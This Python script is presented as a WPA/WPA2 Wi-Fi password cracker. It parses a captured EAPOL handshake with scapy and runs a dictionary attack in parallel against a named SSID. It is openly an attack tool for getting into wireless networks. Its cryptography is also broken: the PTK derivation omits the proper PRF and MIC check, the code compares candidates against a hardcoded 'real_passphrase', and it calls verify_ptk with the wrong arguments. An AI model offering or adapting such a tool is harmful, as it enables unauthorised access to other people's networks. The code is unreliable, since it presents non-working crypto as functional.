import os
import hashlib
import hmac
import binascii
import argparse
from scapy.all import rdpcap
from itertools import islice
from tqdm import tqdm
from multiprocessing import Pool, cpu_count

def load_handshake(pcap_file):
    """Load the EAPOL handshake packets from the pcap file."""
    if not os.path.exists(pcap_file):
        print("[!] Handshake file not found!")
        return None

    packets = rdpcap(pcap_file)
    handshake = [pkt for pkt in packets if pkt.haslayer("EAPOL")]

    if len(handshake) >= 4:
        print("[+] Handshake successfully captured!")
        return handshake
    else:
        print("[!] Handshake incomplete or missing.")
        return None

def generate_ptk(passphrase, ssid, ap_mac, client_mac, anonce, snonce):
    """Generate PTK from passphrase, SSID, and handshake values."""
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    ptk = hmac.new(pmk, b''.join(sorted([ap_mac, client_mac]) + [anonce, snonce]), hashlib.sha1).digest()
    return ptk[:16]

def extract_handshake_details(handshake):
    """Extract the necessary details from the handshake."""
    ap_mac = client_mac = anonce = snonce = None

    for pkt in handshake:
        if pkt.haslayer('EAPOL'):
            eapol = pkt['EAPOL']
            if eapol.haslayer('WPAKey') and eapol['WPAKey'].type == 2: 
                ap_mac = pkt.addr2  
                client_mac = pkt.addr1 
                anonce = eapol['WPAKey'].anonce  
            elif eapol.haslayer('WPAKey') and eapol['WPAKey'].type == 3:  
                snonce = eapol['WPAKey'].snonce  

    if not ap_mac or not client_mac or not anonce or not snonce:
        print("[!] Could not extract necessary data from handshake.")
        return None, None, None, None

    return ap_mac, client_mac, anonce, snonce

def verify_ptk(pcap_file, generated_ptk):
    """Verify the PTK by comparing it with the expected PTK from the handshake."""
    handshake = load_handshake(pcap_file)
    if not handshake:
        return False

    ap_mac, client_mac, anonce, snonce = extract_handshake_details(handshake)
    if not ap_mac or not client_mac or not anonce or not snonce:
        return False

    expected_ptk = generate_ptk('real_passphrase', 'real_ssid', ap_mac, client_mac, anonce, snonce)

    if generated_ptk == expected_ptk:
        return True
    else:
        return False

def try_password(password, ssid, ap_mac, client_mac, anonce, snonce):
    """Attempt to generate PTK for each password in the wordlist."""
    password = password.strip()
    ptk = generate_ptk(password, ssid, ap_mac, client_mac, anonce, snonce)
    print(f"[*] Trying: {password}")
    
    if verify_ptk(ptk): 
        print(f"[✔] Password Found: {password}")
        return password
    return None

def crack_wpa(pcap_file, wordlist, ssid):
    """Crack the WPA password by testing passwords from the wordlist."""
    handshake = load_handshake(pcap_file)
    if not handshake:
        return

    if not os.path.exists(wordlist):
        print("[!] Wordlist file not found!")
        return

    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in islice(f, 1000000)]  

    print(f"[+] Loaded {len(passwords)} passwords...")

    ap_mac, client_mac, anonce, snonce = extract_handshake_details(handshake)
    if not ap_mac or not client_mac or not anonce or not snonce:
        print("[!] Missing necessary handshake details.")
        return

    with Pool(cpu_count()) as pool:
        results = pool.starmap(try_password, [(pw, ssid, ap_mac, client_mac, anonce, snonce) for pw in tqdm(passwords)])

    found_password = next((pw for pw in results if pw), None)
    if found_password:
        print(f"[✔] SUCCESS! The Wi-Fi password is: {found_password}")
    else:
        print("[!] Password not found in wordlist.")

def get_paths():
    pcap_file = input("Enter path to handshake (.cap) file: ").strip()
    wordlist = input("Enter path to wordlist file: ").strip()
    return pcap_file, wordlist

def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 Cracker with Optimized Performance")
    parser.add_argument("--pcap", type=str, help="Path to handshake .cap file")
    parser.add_argument("--wordlist", type=str, help="Path to wordlist file")
    parser.add_argument("--ssid", type=str, required=True, help="Target Wi-Fi SSID")
    args = parser.parse_args()

    if not args.pcap or not args.wordlist:
        print("[*] Enter interactive mode to locate files...")
        args.pcap, args.wordlist = get_paths()


    crack_wpa(args.pcap, args.wordlist, args.ssid)

if __name__ == "__main__":
    main()
